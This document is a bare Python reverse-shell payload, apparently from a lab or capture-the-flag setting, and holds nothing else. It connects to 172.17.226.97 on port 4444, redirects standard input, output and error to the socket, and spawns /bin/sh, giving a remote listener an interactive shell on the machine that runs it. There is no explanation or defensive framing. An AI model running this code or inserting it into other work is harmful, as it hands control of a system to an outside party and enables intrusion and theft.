import socket,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("172.17.226.97",4444))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
